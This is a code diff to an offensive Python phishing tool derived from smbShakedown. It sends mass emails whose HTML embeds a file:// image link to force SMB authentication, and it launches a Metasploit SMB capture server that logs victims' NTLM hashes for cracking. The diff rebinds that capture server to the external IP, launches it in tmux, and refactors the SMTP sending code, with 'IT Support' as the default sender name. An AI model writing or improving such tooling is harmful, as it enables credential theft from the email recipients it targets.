@@ -3,12 +3,12 @@
 Original by Nick Sanzotta:
 https://github.com/NickSanzotta/smbShakedown'''
 try:
-    #http server
-    #import BaseHTTPServer
+
     import SimpleHTTPServer
     from SimpleHTTPServer import SimpleHTTPRequestHandler
 
     import argparse
+    from email.mime.text import MIMEText
     import getpass
     import json
     import multiprocessing
@@ -21,8 +21,6 @@ try:
     import subprocess
     import sys
     import time
-    import urllib
-    import urllib2
     import readline
     import requests
     import signal
@@ -58,7 +56,7 @@ class Smbshakedown(object):
 
         #call methods to autodiscover local and external IPs
         self.external_ip = self.get_external_ip().strip('\n')
-        self.internal_ip = self.get_internal_address()
+        self.internal_ip = self.get_internal_address().strip('\n')
 
         self.http_server_pid = None
 
@@ -132,16 +130,17 @@ Recipients:     {9}\n').format(self.rc_file, self.sender_address, self.sender_na
 
     def smb_server(self):
         smb_server_option = self.yes_no('Use a local Metasploit SMB capture server in a screen session called msf_shakedown? (y/n): ')
-        
+        #need to allow a choice of internal or external ip
         if smb_server_option is True:
             rc_config = \
-            'use auxiliary/server/capture/smb\n\
-set srvhost {}\n\
-set JOHNPWFILE /opt/smbShakedown/smb_hashes\n\
-exploit -j -z'.format(self.get_internal_address())
+            'use auxiliary/server/capture/smb\n'+\
+            'set srvhost {}\n'.format(self.external_ip)+\
+            'set JOHNPWFILE /opt/smbShakedown/smb_hashes\n'+\
+            'exploit -j -z'
         
 
             print('\n{}\n').format(str(rc_config))
+            
             validate_rc_file = self.yes_no('rc file ready to execute? (y/n): ')
 
             if validate_rc_file is True:
@@ -149,13 +148,12 @@ exploit -j -z'.format(self.get_internal_address())
                     rc_file.writelines(str(rc_config))
                     rc_file.close()
                 try:
-                    print('Starting screen -S "msf_shakedown" -d -m')
-                    os.system('screen -S "msf_shakedown" -d -m')
-                    print('Screen session started')
-                    print('Running msfconsole -q -r {}'.format(self.rc_file))
-                    #os.system('msfconsole -q -r {}'.format(self.rc_file))
-                    os.system('screen -r "msf_shakedown" -X msfconsole -q -r {} $\n'.format(self.rc_file)) 
-                    
+                    print('Starting screen...')
+                    proc = subprocess.Popen(['tmux', 'new-session', '-d', '-s', 'msf_shakedown',\
+                     'msfconsole -q -r {}'.format(self.rc_file)], stdout=subprocess.PIPE)
+                    (out, err) = proc.communicate()
+                    print('Screen sessions: {}'.format(out))
+
                 except Exception as e:
                     print('Error: {}'.format(e))
                     sys.exit(1)
@@ -243,12 +241,11 @@ sincerely,
 <img src=file://{0}/image/foo.gif>
 </body>
 </html>
-            """.format(self.external_ip, self.redirect_url)
+.
+""".format(self.external_ip, self.redirect_url)
         print('\nHTML Hosted:\n{}'.format(html))
 
         self.write_file(html, './index.html')
-
-
 
     def exit_gracefully(self, signal, frame):
         print('\nCaught Ctrl+C')
@@ -259,18 +256,15 @@ sincerely,
             except Exception as e:
                 print(e)
 
-        print('Check remaining screen sessions')
-        proc = subprocess.Popen(["screen","-list"], stdout=subprocess.PIPE)
+        print('Check remaining tmux sessions')
+        proc = subprocess.Popen(["tmux","ls"], stdout=subprocess.PIPE)
         (out, err) = proc.communicate()
-        print('Screen sessions: {}'.format(out))
-
-        
-
+        print('Tmux sessions: {}'.format(out))
 
         sys.exit(1)
 
     def run_http_server(self):
-        '''Starts Python's SimpleHTTPServer on specified port'''
+        '''Starts Python's SimpleHTTPServer on a specified port'''
         if self.image_server_port is not None:
             print('Starting local http server on tcp/{}'.format(str(self.image_server_port)))
 
@@ -291,49 +285,57 @@ sincerely,
             except Exception as e:
                 httpd.server_close()
                 print(e)
-            # Create process
-
             try:
                 server_process.start()
             except Exception as e:
                 print(e)
 
-            
             self.http_server_pid = server_process.pid
             print('Server running at PID: {}').format(self.http_server_pid)
 
             return self.http_server_pid
 
     def smtp_connection(self):
-        recipient_list = self.read_file(self.recipients_file)
-        recipients = ",".join(recipient_list)
-        
-
+        recipients = self.read_file(self.recipients_file)
         msg_body = self.craft_message_body()
 
-        smtpserver = smtplib.SMTP(self.smtp_server, self.smtp_port)
-        smtpserver.ehlo()
-        smtpserver.starttls()
-        smtpserver.ehlo
-        smtpserver.login(self.smtp_username, self.smtp_password)
+        '''s = smtplib.SMTP(self.smtp_server, self.smtp_port)
+        s.set_debuglevel(1)
+        msg = MIMEText(msg_body)
+        sender = self.sender_address
+        recipients = recipients
+        msg['Subject'] = "Thank you for all your help."
+        msg['From'] = self.sender_name
+        msg['To'] = ", ".join(recipients)
+        
+        try:
+            s.sendmail(sender, recipients, msg.as_string())
+        except Exception as e:
+            print(e)
+        s.quit()'''
+
+        smtp_server = smtplib.SMTP(self.smtp_server, self.smtp_port)
+        smtp_server.ehlo()
+        smtp_server.starttls()
+        smtp_server.ehlo
+        smtp_server.login(self.smtp_username, self.smtp_password)
         print('Testing Connection to your SMTP Server...')
         time.sleep(1)
         try:
-            status = smtpserver.noop()[0]
+            status = smtp_server.noop()[0]
             print("SMTP Server Status: ",status)
             send_prompt = self.yes_no("Connection successful, send mail now? (y/n): ")
 
             if send_prompt is True:
                 #from addr, to addr, msg
                 print(self.sender_address, recipients, msg_body)
-                smtpserver.sendmail(self.sender_address, recipients, msg_body)
+                smtp_server.sendmail(self.sender_address, recipients, msg_body)
                 print("Message(s) sent!")
-                smtpserver.quit()
+                smtp_server.quit()
 
             else:
-                smtpserver.quit()
+                smtp_server.quit()
                 print("Ok no mail sent.")
-
 
         except Exception as e:
             print('Error: {}'.format(e))
@@ -366,11 +368,6 @@ def main():
         metavar='<8080>',\
         nargs=1,\
         help='Run local HTTP server to host image using specified port, e.g. -i 8080')
-
-    '''parser.add_argument('-l', '--image_server_addr', \
-        metavar='<foo.com>',\
-        nargs=1,\
-        help='custom URL for image link if not hosted locally')'''
 
     parser.add_argument('-n', '--sender_name', \
         metavar='<IT Support>', \
